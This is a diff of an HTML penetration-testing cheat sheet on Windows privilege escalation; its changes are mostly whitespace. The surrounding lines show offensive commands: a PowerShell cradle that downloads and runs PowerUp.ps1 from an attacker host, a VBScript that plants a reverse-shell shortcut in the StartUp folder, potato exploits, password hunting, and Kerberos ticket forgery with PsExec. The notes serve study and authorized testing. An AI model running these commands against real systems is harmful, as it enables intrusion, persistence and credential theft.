@@ -8,13 +8,13 @@ layout: default
 </head>
 
 <body>
-
+    
     <h1>Windows PrivEsc</h1>
-
+    
     <hr>
-
+    
     <h2>Manual PrivEsc:</h2>
-
+    
     <li>Use rlwrap on shell to enable arrow usage (up and down to navigate previous commands, left and right to navigate text)</li>
     <li>Check user groups and privileges</li>
     <ul>
@@ -150,11 +150,11 @@ layout: default
         <li>ASREPRoast</li>
         <li>Kerberoast</li>
     </ul>
-
+    
     <hr>
-
+    
     <h2>PrivEsc Tools</h2>
-
+    
     <li>Powerup.ps1</li>
     <ul>
         <li>IEX(New-Object Net.WebClient).downloadString('http://&lt;ip address&gt;/PowerUp.ps1&#039;)</li>
@@ -213,11 +213,11 @@ layout: default
     <ul>
         <li>Common C# offensive tools that are checked for updates daily, and then compiled</li>
     </ul>
-
+    
     <hr>
-
+    
     <h2>cmd Commands</h2>
-
+    
     <li>Location: C:\Windows\System32\cmd.exe</li>
     <li>Miscellaneous</li>
     <table>
@@ -409,11 +409,11 @@ layout: default
             <td>ipconfig /all</td>
         </tr>
     </table>
-
+    
     <hr>
-
+    
     <h2>Powershell Commands</h2>
-
+    
     <li>System Information & Control</li>
     <table>
         <tr>
@@ -521,11 +521,11 @@ layout: default
             <td>.\&lt;script&gt;.ps1<br>iex (New-Object System.Net.Webclient).DownloadString(&#039;https://website.com/url/to/file.ps1&#039;)</td>
         </tr>
     </table>
-
+    
     <hr>
-
+    
     <h2>File Transfers</h2>
-
+    
     <li>Download to Windows</li>
     <table>
         <tr>
@@ -634,7 +634,7 @@ layout: default
             </td>
         </tr>
     </table>
-
+    
     <li>Upload to windows</li>
     <table>
         <tr>
@@ -711,11 +711,11 @@ layout: default
             </td>
         </tr>
     </table>
-
+    
     <hr>
-
+    
     <h2>Startup Apps</h2>
-
+    
     <li>Program for startup apps that should start for all users (including admin):</li>
     <ul>
         <li>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</li>
@@ -730,21 +730,15 @@ layout: default
         <li>files in StartUp directory must be shortcuts (.lnk)</li>
         <ul>
             <li>VBScript to create a shortcut file:</li>
-            <pre>
-                Set oWS = WScript.CreateObject("WScript.Shell")
-                sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
-                Set oLink = oWS.CreateShortcut(sLinkFile)
-                oLink.TargetPath = "C:\PrivEsc\reverse.exe"
-                oLink.Save
-            </pre>
+            <pre>&#13;&#10;Set oWS = WScript.CreateObject(&quot;WScript.Shell&quot;)&#13;&#10;sLinkFile = &quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk&quot;&#13;&#10;Set oLink = oWS.CreateShortcut(sLinkFile)&#13;&#10;oLink.TargetPath = &quot;C:\PrivEsc\reverse.exe&quot;&#13;&#10;oLink.Save&#13;&#10;            </pre>
         </ul>
         <li>cmd "cscript CreateShortCut.vbs"</li>
     </ul>
-
+    
     <hr>
-
+    
     <h2>Prilivege Abuse</h2>
-
+    
     <li>SeImpersonatePrivilege</li>
     <li>Rotten Potato</li>
     <ul>
@@ -755,7 +749,7 @@ layout: default
     <ul>
         <li>JuicyPotato.exe -l 1337 -p &lt;program&gt; -t * -c &lt;{CLSID}&gt;</li>
     </ul>
-
+    
     <li>Rogue Potato</li>
     <ul>
         <li>More advanced and complicated than previous potato exploits.</li>
@@ -819,7 +813,7 @@ layout: default
             <li>Should have system shell.</li>
         </ul>
     </ul>
-
+    
     <li>SeBackupPrivilege</li>
     <ul>
         <li>Grants read access to all objects on the system regardless of ACL</li>
@@ -898,7 +892,7 @@ layout: default
             </tr>
         </table>
     </ul>
-
+    
     <li>SeRestorePrivilege</li>
     <ul>
         <li>Grants write access to all objects on the system regardless of ACL</li>
@@ -906,18 +900,18 @@ layout: default
         <li>Overwrite DLLs used by SYSTEM processes</li>
         <li>Modify registry settings</li>
     </ul>
-
+    
     <li>SeTakeOwnershipPrivilege</li>
     <ul>
         <li>Lets the owner take ownership over an object</li>
         <li>Same as SeRestorePrivilege after taking ownership of files</li>
     </ul>
     <li>More reading on token abuse: https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt</li>
-
+    
     <hr>
-
+    
     <h2>Always Install Elevated</h2>
-
+    
     <li>Check if enabled</li>
     <ul>
         <li>HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer</li>
@@ -930,11 +924,11 @@ layout: default
         </ul>
         <li>Create msi reverse shell and execute it</li>
     </ul>
-
+    
     <hr>
-
+    
     <h2>Autorun Applications</h2>
-
+    
     <li>Enumerate Auto Run Programs</li>
     <ul>
         <li>reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</li>
@@ -943,11 +937,11 @@ layout: default
             <li>accesschk.exe /accepteula -quvw &lt;user&gt; &lt;service&gt;</li>
         </ul>
     </ul>
-
+    
     <hr>
-
+    
     <h2>Insecure File Permissions</h2>
-
+    
     <li>Look for files of any type that can help break into the system.  Scripts with hardcoded credentials, other sensitive files, etc.</li>
     <li>Search for world writable files:</li>
     <ul>
@@ -966,11 +960,11 @@ layout: default
     <ul>
         <li>findstr /si password *.xml *.ini *.txt</li>
     </ul>
-
+    
     <hr>
-
+    
     <h2>Insecure Services</h2>
-
+    
     <li>Manually enumerate insecure services</li>
     <table>
         <tr>
@@ -1230,11 +1224,11 @@ layout: default
         </ul>
         <li>Start the vulnerable service</li>
     </ul>
-
+    
     <hr>
-
+    
     <h2>Scheduled Tasks</h2>
-
+    
     <li>Tasks run at time intervals or by events (log-on, etc)</li>
     <li>Tasks run with privileges of user who created them.</li>
     <ul>
@@ -1724,11 +1718,11 @@ layout: default
             </td>
         </tr>
     </table>
-
+    
     <hr>
-
+    
     <h2>Overpass the Hash</h2>
-
+    
     <li>Turn NTLM hash into Kerberos ticket to avoid the use of NTLM authentication</li>
     <ul>
         <li>Retrieve NTLM hash for user</li>
@@ -1759,9 +1753,9 @@ layout: default
             <li>.\PsExec.exe \\&lt;domain controller &ndash; ex. dc01&gt; cmd.exe</li>
         </ul>
     </ul>
-
+    
     <hr>
-
+    
     <h2>Silver Ticket</h2>
     <li>Forge TGS using a service account password or NTLM hash in order to access any resources that the service account has permissions to</li>
     <li>If the SPN is used on multiple servers the ticket can be leveraged against them all.</li>
@@ -1797,11 +1791,11 @@ layout: default
             <li>Kerberos::list</li>
         </ul>
     </ul>
-
+    
     <hr>
-
+    
     <h2>Golden Ticket</h2>
-
+    
     <li>Gives access to anything and everything</li>
     <li>Requires the password or hash for the service account krbtgt</li>
     <li>Must have access to an account that is a member of the domain admins group or have access to the domain controller itself.</li>
@@ -1839,7 +1833,7 @@ layout: default
             </ul>
         </ul>
     </ul>
-
+    
     <li>Creating the golden ticket on windows</li>
     <ul>
         <li>Get domain SID & krbtgt hash</li>
@@ -1864,6 +1858,6 @@ layout: default
             <li>Psexec.exe \\&lt;domain controller&gt; cmd.exe</li>
         </ul>
     </ul>
-
+    
 </body>
 </html>
